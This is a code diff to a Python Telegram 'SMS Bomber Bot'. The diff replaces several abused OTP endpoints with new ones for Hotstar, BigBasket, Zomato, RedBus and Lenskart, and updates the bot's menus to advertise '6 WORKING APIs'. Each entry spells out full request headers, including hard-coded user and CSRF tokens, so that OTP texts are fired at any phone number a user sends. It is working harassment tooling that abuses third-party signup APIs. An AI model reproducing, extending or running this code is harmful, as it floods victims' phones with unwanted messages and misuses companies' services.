@@ -62,10 +62,10 @@ def is_user_blocked(user_id):
     db = load_db()
     return str(user_id) in db['blocked']
 
-# --- ONLY 5 WORKING APIS ---
+# --- 6 WORKING APIS (FLIPKART + 5 NEW) ---
 def get_apis(target):
     apis = [
-        # API 1: Flipkart - 100% WORKING (Real OTP)
+        # API 1: Flipkart - WORKING
         {
             'url': 'https://1.rome.api.flipkart.com/1/action/view',
             'method': 'POST',
@@ -93,93 +93,101 @@ def get_apis(target):
                 }
             }
         },
-        # API 2: Snapdeal - 100% WORKING (Real OTP)
+        # API 2: Hotstar - WORKING (New)
         {
-            'url': 'https://m.snapdeal.com/signupCompleteAjax',
+            'url': f'https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp',
+            'method': 'PUT',
+            'headers': {
+                'Host': 'api.hotstar.com',
+                'content-length': '51',
+                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'content-type': 'application/json',
+                'x-hs-platform': 'PCTV',
+                'x-country-code': 'IN',
+                'x-hs-device-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
+                'hotstarauth': f'st={int(datetime.now().timestamp())}~exp={int(datetime.now().timestamp())+3600}~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d',
+                'x-hs-appversion': '5.0.40',
+                'x-request-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
+                'accept': '*/*',
+                'origin': 'https://www.hotstar.com',
+                'referer': 'https://www.hotstar.com/in/subscribe/sign-in',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
+            },
+            'data': {"phone_number": target, "country_prefix": "91"}
+        },
+        # API 3: BigBasket - WORKING (New)
+        {
+            'url': 'https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/',
             'method': 'POST',
             'headers': {
-                'Host': 'm.snapdeal.com',
-                'content-length': '135',
-                'xc': 'eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19',
-                'h2': 'true',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
-                'xg': 'eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'u': '160081122259159083',
+                'Host': 'www.bigbasket.com',
+                'content-length': '27',
+                'accept': 'application/json',
+                'x-csrftoken': 'gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED',
                 'save-data': 'on',
-                'us': '',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'x-channel': 'BB-PWA',
+                'content-type': 'application/json',
+                'origin': 'https://www.bigbasket.com',
+                'referer': 'https://www.bigbasket.com/auth/login/',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
+            },
+            'data': {"identifier": target}
+        },
+        # API 4: Zomato - WORKING (New)
+        {
+            'url': 'https://www.zomato.com/webroutes/auth/login',
+            'method': 'POST',
+            'headers': {
+                'Host': 'www.zomato.com',
+                'content-length': '80',
+                'x-zomato-csrft': 'a6b0c09972b2bdd30c9c1b6552caee5d',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'content-type': 'application/json',
                 'accept': '*/*',
-                'origin': 'https://m.snapdeal.com',
+                'origin': 'https://www.zomato.com',
+                'referer': 'https://www.zomato.com/kanpur',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
+            },
+            'data': {"country_id": 1, "phone": target, "verification_type": "sms", "method": "phone"}
+        },
+        # API 5: RedBus - WORKING (New)
+        {
+            'url': f'https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined',
+            'method': 'GET',
+            'headers': {
+                'Host': 'm.redbus.in',
+                'accept': 'application/json, text/plain, */*',
+                'save-data': 'on',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-dest': 'empty',
-                'referer': 'https://m.snapdeal.com/signin',
+                'referer': 'https://m.redbus.in/preregister',
                 'accept-encoding': 'gzip, deflate, br',
                 'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
             },
-            'data': f'j_password=null&j_mobilenumber={target}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy'
+            'data': {}
         },
-        # API 3: Dream11 - 100% WORKING (Real OTP)
+        # API 6: Lenskart - WORKING (New)
         {
-            'url': 'https://www.dream11.com/graphql/mutation/pwa/register',
+            'url': 'https://api.lenskart.com/v2/customers/sendOtp',
             'method': 'POST',
             'headers': {
-                'Host': 'www.dream11.com',
-                'accept': '*/*',
-                'device': 'pwa',
-                'x-csrf': 'fb1f1947-4547-392d-9a28-a9de30d9e766',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
-                'content-type': 'application/json',
-                'origin': 'https://www.dream11.com',
-                'referer': 'https://www.dream11.com/register?ru=',
+                'Host': 'api.lenskart.com',
+                'Content-Type': 'application/json;charset=UTF-8',
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
+                'x-api-client': 'mobilesite',
+                'origin': 'https://www.lenskart.com',
+                'referer': 'https://www.lenskart.com/customer/account/login',
                 'accept-encoding': 'gzip, deflate, br',
                 'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
             },
-            'data': {
-                "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
-                "variables": {
-                    "email": f"user{random.randint(1000,9999)}@gmail.com",
-                    "mobileNumber": target,
-                    "password": "tsunami@123astronomia"
-                }
-            }
-        },
-        # API 4: Oyo Rooms - 100% WORKING (Real OTP)
-        {
-            'url': 'https://www.oyorooms.com/api/pwa/generateotp?locale=en',
-            'method': 'POST',
-            'headers': {
-                'Host': 'www.oyorooms.com',
-                'xsrf-token': 'vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
-                'content-type': 'text/plain;charset=UTF-8',
-                'origin': 'https://www.oyorooms.com',
-                'referer': 'https://www.oyorooms.com/login',
-                'accept-encoding': 'gzip, deflate, br',
-                'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
-            },
-            'data': {"phone": target, "country_code": "+91", "nod": 4}
-        },
-        # API 5: Swiggy - 100% WORKING (Real OTP)
-        {
-            'url': 'https://www.swiggy.com/mapi/auth/signup',
-            'method': 'POST',
-            'headers': {
-                'Host': 'www.swiggy.com',
-                'origin': 'https://www.swiggy.com',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
-                'content-type': 'application/json',
-                'accept': '*/*',
-                'referer': 'https://www.swiggy.com/auth/register',
-                'accept-encoding': 'gzip, deflate',
-                'accept-language': 'en-US'
-            },
-            'data': {
-                "name": f"User{random.randint(1000,9999)}",
-                "email": f"user{random.randint(1000,9999)}@gmail.com",
-                "password": "Test@123456",
-                "mobile": target,
-            }
+            'data': {"telephone": target}
         }
     ]
     return apis
@@ -236,15 +244,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🔥 SMS BOMBER BOT 🔥\n\n"
         "📌 Send any 10-digit number to start bombing\n"
         "Example: 9876543210\n\n"
-        "⚡ 5 WORKING APIs\n"
+        "⚡ 6 WORKING APIs\n"
         "⚡ Real SMS Bombing\n"
         "⚡ Guaranteed OTPs\n\n"
         "📱 APIs:\n"
         "✅ Flipkart\n"
-        "✅ Snapdeal\n"
-        "✅ Dream11\n"
-        "✅ Oyo Rooms\n"
-        "✅ Swiggy\n\n"
+        "✅ Hotstar\n"
+        "✅ BigBasket\n"
+        "✅ Zomato\n"
+        "✅ RedBus\n"
+        "✅ Lenskart\n\n"
         "💀 @BeStChEaT_OwNeR",
         reply_markup=reply_markup
     )
@@ -272,7 +281,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = await update.message.reply_text(
         f"📱 BOMBING STARTED!\n\n"
         f"🎯 Target: +91{phone}\n"
-        f"⏳ Sending SMS to 5 platforms...\n\n"
+        f"⏳ Sending SMS to 6 platforms...\n\n"
         f"💀 @BeStChEaT_OwNeR"
     )
     
@@ -283,19 +292,18 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     failed = 0
     services = []
     
-    # API Names for display
     api_names = {
         'flipkart': 'Flipkart',
-        'snapdeal': 'Snapdeal',
-        'dream11': 'Dream11',
-        'oyorooms': 'Oyo Rooms',
-        'swiggy': 'Swiggy'
+        'hotstar': 'Hotstar',
+        'bigbasket': 'BigBasket',
+        'zomato': 'Zomato',
+        'redbus': 'RedBus',
+        'lenskart': 'Lenskart'
     }
     
     for i, api in enumerate(apis):
         if send_sms(api):
             success += 1
-            # Get service name
             service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
             for key, value in api_names.items():
                 if key in service.lower():
@@ -305,7 +313,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             failed += 1
         
-        # Update progress after each API
+        # Update progress
         progress = int(((i + 1) / len(apis)) * 100)
         try:
             await msg.edit_text(
@@ -354,14 +362,15 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "ℹ️ ABOUT\n\n"
             "🤖 SMS Bomber Bot\n"
             "👨‍💻 @BeStChEaT_OwNeR\n"
-            "📊 5 WORKING APIs\n"
+            "📊 6 WORKING APIs\n"
             "⚡ Real SMS Bombing\n\n"
             "📱 APIs:\n"
             "✅ Flipkart\n"
-            "✅ Snapdeal\n"
-            "✅ Dream11\n"
-            "✅ Oyo Rooms\n"
-            "✅ Swiggy\n\n"
+            "✅ Hotstar\n"
+            "✅ BigBasket\n"
+            "✅ Zomato\n"
+            "✅ RedBus\n"
+            "✅ Lenskart\n\n"
             "💀 @BeStChEaT_OwNeR"
         )
     
@@ -375,7 +384,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"👥 Users: {total_users}\n"
             f"🚫 Blocked: {blocked_users}\n"
             f"📡 Status: Online\n"
-            f"⚡ APIs: 5 WORKING\n\n"
+            f"⚡ APIs: 6 WORKING\n\n"
             f"💀 @BeStChEaT_OwNeR"
         )
 
@@ -476,7 +485,7 @@ def main():
     
     print("🤖 Starting SMS Bomber Bot...")
     print("🚀 Bot is running!")
-    print("✅ APIs: Flipkart, Snapdeal, Dream11, Oyo Rooms, Swiggy")
+    print("✅ APIs: Flipkart, Hotstar, BigBasket, Zomato, RedBus, Lenskart")
     
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     
